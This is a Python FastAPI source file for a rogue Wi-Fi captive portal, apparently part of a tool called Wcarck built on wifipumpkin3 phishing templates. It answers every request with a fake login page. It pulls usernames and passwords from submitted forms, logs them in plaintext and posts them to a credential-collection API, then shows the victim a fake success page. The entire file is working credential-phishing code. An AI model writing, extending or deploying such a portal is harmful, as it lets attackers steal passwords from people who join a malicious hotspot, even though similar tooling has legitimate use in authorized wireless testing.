import os
import argparse
import asyncio
import httpx
from fastapi import FastAPI, Request, Form
from fastapi.responses import HTMLResponse, RedirectResponse
from fastapi.staticfiles import StaticFiles
from fastapi.templating import Jinja2Templates
from urllib.parse import urlparse
import structlog
import uvicorn

logger = structlog.get_logger()

# Wifipumpkin3 Templates Base Path
# e.g., ESTBTOOLs/wifipumpkin3/config/templates/
WIFIPUMPKIN3_BASE = os.path.abspath(os.path.join(
    os.path.dirname(__file__), 
    "..", "..", "..", "..", 
    "ESTBTOOLs", "wifipumpkin3", "config", "templates"
))

# Main API Webhook Endpoint (Assuming Wcarck main runs on 8000)
WCARCK_API_URL = "http://127.0.0.1:8000/api/credentials/captured"

app = FastAPI()

def run_portal(template: str, job_id: str):
    template_dir = os.path.join(WIFIPUMPKIN3_BASE, template)
    
    # Ensure template exists
    if not os.path.exists(template_dir):
        logger.error(f"Template not found: {template_dir}")
        import sys
        sys.exit(1)
        
    static_dir = os.path.join(template_dir, "static")
    templates_dir = os.path.join(template_dir, "templates")
    
    if os.path.exists(static_dir):
        app.mount("/static", StaticFiles(directory=static_dir), name="static")
    else:
        logger.warning(f"No static folder found for template {template}")
        
    templates = Jinja2Templates(directory=templates_dir)
    
    # Catch-All GET Route to serve the portal
    @app.get("/{path:path}", response_class=HTMLResponse)
    async def get_portal(request: Request, path: str):
        # Always render login.html regardless of the requested path
        return templates.TemplateResponse("login.html", {"request": request})

    # Generic POST Route to catch credentials
    @app.post("/{path:path}")
    async def post_credentials(request: Request, path: str):
        form_data = await request.form()
        
        # Heuristically extract username/password fields based on common phishing template names
        username = form_data.get("username") or form_data.get("login") or form_data.get("email") or ""
        password = form_data.get("password") or form_data.get("pass") or form_data.get("key") or ""
        
        client_mac = "Unknown"  # Would require an ARP lookup or DNSmasq lease parse in a real setup, but for now we send the IP
        client_ip = request.client.host if request.client else "Unknown"
        
        logger.info(f"CAPTURED CREDENTIAL - IP: {client_ip} | U: {username} | P: {password}")
        
        # Forward to Wcarck API
        try:
            async with httpx.AsyncClient() as client:
                await client.post(WCARCK_API_URL, json={
                    "job_id": job_id,
                    "type": "portal",
                    "username": username,
                    "plainText": password,
                    "client_mac": client_ip,  # Passing IP in MAC field for MVP
                    "valid": True
                })
        except Exception as e:
            logger.error(f"Failed to webhook credential to main API: {e}")
            
        # Try to render a success page if it exists in the template, else redirect to a fake generic URL
        try:
            return templates.TemplateResponse("login_successful.html", {"request": request})
        except Exception:
            return HTMLResponse("<html><body>Success. You may now close this window.</body></html>")

    uvicorn.run(app, host="0.0.0.0", port=80, log_level="warning")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Wcarck Captive Portal")
    parser.add_argument("--template", required=True, help="Template folder name (e.g., Login_v4)")
    parser.add_argument("--job_id", required=True, help="Job ID associated with this portal")
    args = parser.parse_args()
    
    run_portal(args.template, args.job_id)
